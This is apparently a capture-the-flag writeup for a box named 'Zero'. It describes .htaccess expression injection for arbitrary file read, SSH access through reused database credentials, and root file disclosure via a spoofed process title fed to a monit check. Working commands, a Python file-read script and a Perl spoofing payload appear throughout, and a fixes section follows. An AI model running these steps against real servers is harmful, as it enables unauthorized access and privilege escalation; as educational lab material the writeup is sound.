# Zero

### A web-to-root writeup: `.htaccess` misconfiguration to Apache config-injection

[![Category](https://img.shields.io/badge/category-Web-important)](https://img.shields.io/badge/category-Web-important) [![Difficulty](https://img.shields.io/badge/difficulty-Insane-critical)](https://img.shields.io/badge/difficulty-Insane-critical) [![Tool](https://img.shields.io/badge/tool-Apache%2F.htaccess%2F%20mod_headers-orange)](https://img.shields.io/badge/tool-Apache%2F.htaccess%2F%20mod_headers-orange) [![Vulns](https://img.shields.io/badge/vuln-arbitrary%20file%20read%20%2B%20process%2Dcmdline%20injection-red)](https://img.shields.io/badge/vuln-arbitrary%20file%20read%20%2B%20process%2Dcmdline%20injection-red) [![Flag](https://img.shields.io/badge/flag-user_%26_root-lightgrey)](https://img.shields.io/badge/flag-user_%26_root-lightgrey)

---

> **TL;DR**: The box is a "free home page hoster": strangers get an SFTP account whose `public_html/` is served under `/~user/` with **user-controlled `.htaccess`**. Apache's `mod_headers` expression engine turns that into **arbitrary file read** (any file the web worker can read). The web source leaks **hard-coded MySQL credentials that are reused as the SSH password** for `zroadmin`. On the box, a root-run monit check, `zro.web-confcheck`, turns **any process whose command line matches a loose `pgrep -f` regex** into an `apache2ctl -t` command executed as root. Spoof a process title (Perl `$0`), point Apache's `-d ServerRoot` at a poisoned config containing `Include /root/root.txt`, and an Apache syntax error: which quotes the offending line: hands us the **root flag** through its own `-E` error log. No flag values are included below, solve it yourself.

**Goal**, the usual one: read `/root/root.txt`.

## Table of Contents

-   [Setting up the hostname](#setting-up-the-hostname)
-   [Footprinting](#footprinting)
-   [The web app: free credentials, free hosting](#the-web-app-free-credentials-free-hosting)
-   [SFTP & `.htaccess`: a user-controlled config file](#sftp--htaccess-a-user-controlled-config-file)
-   [The bug #1: the expression engine becomes a file-read oracle](#the-bug-1-the-expression-engine-becomes-a-file-read-oracle)
-   [From arbitrary file read to SSH access](#from-arbitrary-file-read-to-ssh-access)
-   [Privilege escalation: a root cron you never officially saw](#privilege-escalation-a-root-cron-you-never-officially-saw)
-   [The bug #2: the check script trusts the process table](#the-bug-2-the-check-script-trusts-the-process-table)
-   [Exploit: making root run *our* Apache config](#exploit-making-root-run-our-apache-config)
-   [Checking it actually worked](#checking-it-actually-worked)
-   [Why this happens / how you'd fix it](#why-this-happens--how-youd-fix-it)
-   [References](#references)

---

## Setting up the hostname

Nothing magic here, but a stable name saves headaches later (the box answers on its IP regardless, but `~user/` URLs read better with a name):

```bash
echo "10.129.234.62 zero.vl" | sudo tee -a /etc/hosts
```

> **Note**: The official box advertises itself as `zero.vl`. On an HTB instance you'd use the `.htb` TLD convention instead; the hostname is cosmetic, the IP is what matters.

## Footprinting

Standard TCP sweep first, then targeted service detection:

```bash
$ nmap -Pn -sT --top-ports 200 10.129.234.62
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 10.129.234.62
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
Nmap done: 1 IP address (1 host up) scanned in 1.68 seconds

$ nmap -Pn -A -p 22,80 10.129.234.62
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Page moved.
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Two ports. The web title *"Page moved"* is just a `<meta http-equiv="refresh" content="0;/index.php">`: the app is at `/index.php`.

## The web app: free credentials, free hosting

`/index.php` is a Bootstrap landing page for "**Zero**: your free home page hoster". It brags about secure SFTP uploads and static HTML hosting. There's a `Sign up today` button pointing at `/signup.php`.

`/signup.php` has almost no HTML of interest. One line does all the work, and it's a **client-side call we can replicate without a browser**:

```javascript
xhttp.open("GET", "/get-credentials-please-do-not-spam-this-thanks.php", true);
```

The endpoint sleeps 15 seconds ("account creation takes 15s. Thanks for waiting.") and then answers with credentials:

```bash
$ curl -s http://10.129.234.62/get-credentials-please-do-not-spam-this-thanks.php
<p class="lead">Your personal account is ready to be used:<br><br>
Username: <b>zro-XXXXXX</b><br>Password: <b>XXXXXXXX</b><br><br>
You can use the provided credentials to upload your pages via sftp://zero.vl.
Your personal home page will be available <a href="http://zero.vl/~zro-XXXXXX">here</a>.
```

So the flow is: generate credentials **→** log into **SFTP** (yes, port 22 is shared) **→** drop HTML into `public_html/` **→** pages served at `http://zero.vl/~user/`.

> **Tip**: Two patience notes from actually running this:
> 1. `~` here means Apache `mod_userdir`: `/~user/` maps to `/home/user/public_html/`. That detail matters later.
> 2. Right after creation, `sftp` may refuse with *Permission denied*: the account is materialized by a background job. Wait ~30-60 s and retry; don't blindly re-request credentials.

## SFTP & `.htaccess`: a user-controlled config file

```bash
$ sftp zro-XXXXXX@zero.vl
sftp> cd public_html
sftp> ls -lah
-rw-r--r--    ? 0        0            49B  .htaccess
-rw-r--r--    ? 1001     1001         349B  index.html
```

Two files: a static `index.html` and, sitting right there: an **`.htaccess` we own the directory of**. On stock Apache with `AllowOverride` enabled, `.htaccess` is applied per-directory as if it were part of the server config. That is both the feature this hoster sells (per-user customization) and the whole foothold.

The stock file:

```apache
Header always set X-Zero-Customer 'zro-XXXXXX'
```

`Header` comes from **`mod_headers`**, and its value can be an *expression* instead of a literal string:

```apache
Header always set Foo "expr=%{md5:foo}"
```

Anything inside `%{...}` is evaluated by Apache's **expression parser** at request time. The parser exposes a lot of functions, and two of them are the ones that break this box:

| Function | Effect | Why it's dangerous |
| --- | --- | --- |
| `base64:` | encode a string/expression result in base64 | lets us push binary/text through an HTTP header |
| `file:` | **read the contents of a file** (line endings included) | arbitrary file read, bound only by the web worker's privileges |

> **Concept**: This is an *expression injection* flavour of the classic "`.htaccess` file read" trick. We never escalate privileges here: whatever the Apache worker can read, we can read: `/etc/passwd`, and more usefully, the PHP source of the app itself. Root-owned files, it can't read. That asymmetry is what shapes the whole box: file read first, then a *second*, separate bug for root.

## The bug #1: the expression engine becomes a file-read oracle

We craft an `.htaccess` that puts a base64-encoded copy of any file into a response header, using a name that's easy to grep:

```apache
Header always set X-Zero-Customer 'zro-XXXXXX'
Header always set X-Leak "expr=%{base64:%{file:/etc/passwd}}"
```

Uploading it has two small operational gotchas you'll hit in real life:

1. The stock `.htaccess` is **owned by root** (mode 644), but the *directory* is ours, and on Unix, delete permission comes from the directory, not the file. So `rm` + `put` works:

```bash
sftp> rm public_html/.htaccess
sftp> put .htaccess public_html/.htaccess
```

2. A freshly uploaded file comes back as **`-rw-r-----` (640) owned by us**: unreadable by the worker user. Apache then answers **`403 Forbidden`** and the header silently disappears. This confused me for a moment; the fix is one `chmod`:

```bash
sftp> chmod 644 public_html/.htaccess
```

Then the read works. Check the response and decode:

```bash
$ curl -I http://zero.vl/~zro-XXXXXX/
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Zero-Customer: zro-XXXXXX
X-Leak: cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb24uLi4=

$ curl -sI http://zero.vl/~zro-XXXXXX/ | grep -i x-leak | cut -d' ' -f2 | base64 -d | head -3
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

Manual curl-per-file gets old fast, so automate it. The upload step is pure paramiko, and the read step is one requests call. I also add the `chmod 644` in the script so the 403 pitfall from above can't happen again:

```python
#!/usr/bin/env python3
import requests, base64, paramiko

HOST, PORT = "zero.vl", 22
USER, PASS  = "zro-XXXXXX", "XXXXXXXX"
URL   = f"http://zero.vl/~{USER}/"
HTACC = "/tmp/.htaccess"

def sftp_upload(host, port, user, pwd, local, remote):
    t = paramiko.Transport((host, port))
    t.connect(username=user, password=pwd)
    s = paramiko.SFTPClient.from_transport(t)
    try: s.remove(remote)
    except IOError: pass
    s.put(local, remote)
    s.chmod(remote, 0o644)   # remember the 403 lesson
    s.close(); t.close()

filename = input("Filename: ")
with open(HTACC, "w") as f:
    f.write(f"Header always set X-Zero-Customer '{USER}'\n")
    f.write(f'Header always set X-Leak "expr=%{{base64:%{{file:{filename}}}}}"\n')

sftp_upload(HOST, PORT, USER, PASS, HTACC, "public_html/.htaccess")
r = requests.get(URL)
print(base64.b64decode(r.headers["X-Leak"]).decode(errors="replace"))
```

## From arbitrary file read to SSH access

The normal thing to enumerate with arbitrary file read is **the web app's own source code**. Two files are the payoff:

```bash
$ ./fileread.py
Filename: /var/www/html/stats.php
```

`stats.php` is a tiny stats page... with its database credentials inline:

```php
<?php
    $mysqli = new mysqli("localhost", "zroadmin", "correct-horse-battery-staple", "zro");
```

And the credential factory we already met:

```php
<?php
$username = "zro-" . substr(hash("sha256",rand()),0,8);
$password = substr(hash("sha256",rand()),0,8);
sleep(15); // This is only here so that you do not create too many users :)
header('X-Zero-Username: ' . $username);
header('X-Zero-Password: ' . $password);
echo('<p class="lead">Your personal account is ready to be used:<br>...');
```

> **Side note**: `rand()` without a dedicated seed is a weak PRNG (the classic `shuffle` C rand is exploitable when predicting tokens). We don't need to attack it here: the app hands credentials out freely anyway, but it's the kind of detail worth noticing and filing away for a future box.

Back to the main thread: the DB credentials `zroadmin:correct-horse-battery-staple` match an **OS user** (grep `/etc/passwd` also shows `zroadmin:x:666:666:...`). Classic **credential reuse**. Try SSH:

```bash
$ sshpass -p 'correct-horse-battery-staple' ssh zroadmin@zero.vl
uid=666(zroadmin) gid=666(zroadmin) groups=666(zroadmin)
```

User flag captured, `/home/zroadmin/user.txt` (redacted here, obviously).

> **Lesson**: credentials found in source are almost always *meant* to be found. The interesting question is always: *which service also accepts them?* Here the query string is `localhost zroadmin` MySQL, but the same password opens a shell. Always try SSH/sudo/ftp with leaked creds before assuming they're only for the service they were hard-coded against.

## Privilege escalation: a root cron you never officially saw

As `zroadmin` we're a low-privileged user. Where do we look next? On a box, scheduled jobs are the classic escalation vector, but `crontab -l` is empty and `/etc/crontab` shows nothing scary. Time to watch the process table for a few minutes instead (pspy does this in style; even a `ps` loop will do).

Shortly after login a suspicious zombie shows up, name truncated to 15 chars:

```
root  2299  0.0  0.0  0 0 ?  Zs 06:42  0:00 [zro.web-confche] <defunct>
```

`zro.web-confche[]` is `zro.web-confcheck`, and it's running **as root**, periodically. Where is it scheduled? Monit, not cron:

```bash
$ ls -la /etc/monit/conf.d/
apache2
zroweb.disabled
```

The joke is in that filename. `zroweb.disabled` *looks* disabled, but monit's default main config includes **`/etc/monit/conf.d/*`**: a shell glob that matches `.disabled` files too. So this is live:

```monit
# /etc/monit/conf.d/zroweb.disabled
# After we had many problems with someone f*cking up the apache configuration
# and restarts failing we will supervise the configuration and alert if
# the configuration check fails.
#   Check runs every 60s.
check program zroweb-confcheck with path /usr/local/bin/zro.web-confcheck
	if status != 0 then alert
```

> **Note**: the same file contains a very useful warning:
> `*** Also it seems there is a background job that will kill the apache2 processes from zroweb from time to time (after 150s or running time). ***`
> We'll come back to this when building the exploit.

And here's the actual script running as root:

```bash
#!/usr/bin/bash
# /usr/local/bin/zro.web-confcheck
RET=0
while read pid _cmd ; do
	# Replace apache2 with apache2ctl and add -t for test
	cmd="${_cmd/apache2/apache2ctl} -t"
	$cmd >/dev/null 2>&1
	RET=$?
done <<< $(/usr/bin/pgrep -lfa "^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf")
if [[ $RET -eq 0 ]] ; then
	echo 'Configuration correct. \o/'
else
	echo 'Configuration broken. Please fix immediately!' >&2
fi
exit $RET
```

## The bug #2: the check script trusts the process table

Function by function:

| Piece | What it does | Why it matters |
| --- | --- | --- |
| `/usr/bin/pgrep -lfa REGEX` | list `pid command-line` for every process whose **full command line** matches REGEX | `-f` matches against `/proc/<pid>/cmdline`, not just the executable name |
| `^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf` | POSIX ERE, **anchored at the start but not at the end** | we can add anything after `/opt/zroweb/conf` and the process still matches |
| `read pid _cmd` | `_cmd` is the *attacker-controllable* command line, verbatim | the loop later executes it |
| `cmd="${_cmd/apache2/apache2ctl} -t"` | replaces the first `apache2` substring with `apache2ctl`, appends ` -t` | our whole cmdline becomes the argument list of a **root-run** `apache2ctl` |
| `$cmd >/dev/null 2>&1` | executes it, output discarded | only affect root leaves is what the *arguments* do |

So the moment an attacker can get **any process** (killed, kept alive, any user) whose cmdline starts with `/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf`, monit will, as root, execute `$cmd` derived from that exact cmdline.

Why is that dangerous? Two properties combine:

1. **Process titles are not authenticated.** Any process can rewrite its own command line. `/proc/<pid>/cmdline` is user-controlled data pretending to be a system fact.
2. **Working with command lines as text is fragile.** The script reconstructs a shell command by string surgery (`/apache2/apache2ctl`), giving us full freedom to design the tail of the string. There is no whitelist of arguments.

Let's prove the mechanics locally before touching the box: the exact equivalent of a "does my logic hold" unit test:

```bash
$ _cmd="/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /home/zroadmin/apache2 -E /home/zroadmin/apache2/log.txt"
$ cmd="${_cmd/apache2/apache2ctl} -t"
$ echo "$cmd"
/opt/zroweb/sbin/apache2ctl -k start -d /opt/zroweb/conf -d /home/zroadmin/apache2 -E /home/zroadmin/apache2/log.txt -t
```

And confirm the regex accepts our fake process title (self-test against a string, `pgrep -f` needs a live process so use `echo | pgrep -f` or just sanity-check the regex with `grep -E`):

```bash
$ printf '%s\n' "/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /home/zroadmin/apache2 -E /home/zroadmin/apache2/log.txt" \
  | grep -E "^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf" && echo MATCH
MATCH
```

Now we control the flags of a root invocation. Which flags do we actually want to smuggle in?

## Exploit: making root run *our* Apache config

We need an Apache behaviour that turns *parsing a config* into *reading a root-only file and giving us the result*. Three pieces of the Apache binary do exactly that:

| Flag / directive | Meaning |
| --- | --- |
| `-d directory` | set **ServerRoot** to an arbitrary absolute path (ours: we'll poison the config there) |
| `Include /root/root.txt` | directive that reads a file and parses its content as config lines |
| `-E file` | write **all error messages** to `file` instead of stderr: file path is relative to the *cwd* of the process, so use an absolute path that we can read |

The chain: root runs `apache2ctl -t`, which parses our poisoned config, hits `Include /root/root.txt`, tries to interpret the flag line as a directive → **`AH00526: Syntax error ... Invalid command '<flag>'`** → and because of `-E /home/zroadmin/apache2/log.txt`, that error message: quoting the flag: lands in a file we own. Apache's config parser has suddenly become a **root-only file read primitive**.

**Step 1: prepare a poisoned ServerRoot.** Copy the stock config so the directory structurally parses, then replace the main file with a *minimal, clean* config. Note `Include /root/root.txt` first: it's the first thing parsed, so its error is first out.

```bash
zroadmin@zero:~$ cp -r /etc/apache2/ apache2
zroadmin@zero:~$ cat > apache2/apache2.conf <<'CONF'
Include /root/root.txt
ServerRoot "/home/zroadmin/apache2"
ServerName "zero"
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
Timeout 300
KeepAlive On
AccessFileName .htaccess
<FilesMatch "^\.ht">
	Require all denied
</FilesMatch>
<Directory />
	Require all denied
</Directory>
CONF
```

> **Tip**: minimality is the point. The stock Debian config pulls in dozens of module snippets and `${APACHE_LOG_DIR}`-style variables that depend on `envvars` (all loaded via `apache2ctl`). Any of them erroring would bury our leak in noise. A small config also makes the *next* iteration easier to debug: which we'll need.

**Step 2: spawn a process matching the `pgrep` regex.** The classic trick is Perl's `$0` (process title) assignment:

```perl
#!/usr/bin/perl
# root.pl
$0 = "/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /home/zroadmin/apache2 -E /home/zroadmin/apache2/log.txt";
sleep(100000);
```

```bash
zroadmin@zero:~$ perl root.pl &
[1] 2824

zroadmin@zero:~$ pgrep -lfa "^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf"
2824 /opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /home/zroadmin/apache2 -E /home/zroadmin/apache2/log.txt
```

`pgrep` matches. On the next monit cycle (≈ every minute), root will run our transformed command:

```bash
# what root executes:
/opt/zroweb/sbin/apache2ctl -k start -d /opt/zroweb/conf -d /home/zroadmin/apache2 -E /home/zroadmin/apache2/log.txt -t
```

The *last* `-d` wins, so **ServerRoot is `/home/zroadmin/apache2`**, and `-E` points into our directory.

**Step 3: defend against the "150 s killer".** That comment in `zroweb.disabled` was a hint: a background job periodically reaps `/opt/zroweb/sbin/apache2`-looking processes. If our fake apache dies at ~150 s, the leak window closes. Keep it alive with a respawn loop:

```bash
zroadmin@zero:~$ nohup sh -c 'while :; do perl /home/zroadmin/root.pl & sleep 95; done' >/dev/null 2>&1 &
```

**Step 4: watch the artifact.** Each 60 s cycle regenerates the log; read it once it's non-empty:

```bash
zroadmin@zero:~$ tail -f /home/zroadmin/apache2/log.txt
```

First cycle: a partial success, and a perfect illustration of why the minimal config helps:

```
AH00534: apache2: Configuration error: No MPM loaded.
```

The `-E` file works (root wrote it, we read it), but Apache aborts before reaching our `Include` because no MPM module is linked. One line fixes it: `LoadModule mpm_prefork_module ...`: reload the config, restart the fake process, and wait for the next cycle.

## Checking it actually worked

```
AH00526: Syntax error on line 1 of /root/root.txt:
Invalid command '<ROOT_FLAG_REDACTED>', perhaps misspelled or defined by a module not included in the server configuration
```

The flag is right inside the error message. Sanity checks that this isn't a fake-out:

```bash
zroadmin@zero:~$ cat /home/zroadmin/user.txt      # user flag, redacted
zroadmin@zero:~$ ls /root/root.txt
ls: cannot access '/root/root.txt': Permission denied
```

`zroadmin` **cannot** read `/root/root.txt` directly: which is exactly the proof that the leak we just read went through the root-run `apache2ctl`. Two bugs, two flags.

## Why this happens / how you'd fix it

Two distinct security failures, two distinct fixes.

**Bug #1: publishing `.htaccess` to strangers on a shared box.** Serving user-modifiable `.htaccess` is legitimate, but it becomes an arbitrary-file-read primitive here because `mod_headers`' expression engine exposes `file:`. The worker user can therefore read every file Apache can, including the app's own PHP source (that's how the DB creds leaked). *The read is bound to the Apache worker's permissions*: that's the entire reason the box needed a second bug for root.

- Use **`<FilesMatch "^\.ht">`-style containment** and, where possible, `AllowOverride` scoped to a *safe subset* of directives (`AllowOverride Limited +AuthConfig` or similar), never `All`.
- If the feature adds no value, **delete `expr=` support** from the request path (or don't expose `mod_headers` to per-user dirs).
- Run the worker (and the DB tokens visible to it) with the **least privilege possible**; secrets readable by the web worker are readable by anyone who can write a `.htaccess`.

**Bug #2: building a shell command from `pgrep` output.** The script treats `/proc/<pid>/cmdline`, which any user can forge for their own processes, as trusted input, then executes it as root. This is a textbook **command/argument injection** via an untrusted process table, in the same family as [CWE-88](https://cwe.mitre.org/data/definitions/88.html) / [CWE-284](https://cwe.mitre.org/data/definitions/284.html).

- **Never derive a command to execute from a `pgrep -f` match.** Match on credentials you control: `pidfile` (monit's `matching` on the *actual* binary is fine, `pgrep -x`/`pgrep -f` on attacker-controlled argv is not).
- Execute **only fixed commands with fixed arguments**. If a dynamic ServerRoot is truly needed, whitelist it (exact path prefix check), never take flags from the process list.
- Set an **explicit, read-only ServerRoot** and an **unprivileged test user** for the config test, so a poisoned config can't be pointed anywhere sensitive.
- Remember the `.disabled` trap: files that *look* disabled but live inside a glob'd directory are enabled. Move them out of `conf.d/` or make the include explicit.

**Lesson that generalizes**: process titles (`$0`, `/proc/*/cmdline`) are *user-controlled strings*, never a security boundary. Any root script that inspects processes and acts on their argv is handing a root shell to whoever can spawn a well-named process.

---

`sftp` · `.htaccess` · `mod_headers` · `expression-injection` · `arbitrary-file-read` · `apache` · `privesc` · `process-title-spoofing` · `monit` · `ctf-writeup`

*Writeup for personal and educational purposes. No flag values are included above: derive them yourself.*

## References

- Apache `mod_headers` and the Apache expression parser: <https://httpd.apache.org/docs/2.4/mod/mod_headers.html>
- `.htaccess` files & `AllowOverride`: <https://httpd.apache.org/docs/2.4/configuring.html>
- Apache binary options: `-d` (ServerRoot), `-t` (config test), `-E` (error file): <https://httpd.apache.org/docs/2.4/programs/httpd.html>
- `pgrep`/`pkill` man page (`-f`, full command line, ERE): <https://man7.org/linux/man-pages/man1/pgrep.1.html>
- Perl `$0` / process title assignment: <https://perldoc.perl.org/perlvar#%240>
- Monit `check program` configuration: <https://mmonit.com/monit/documentation/monit.html>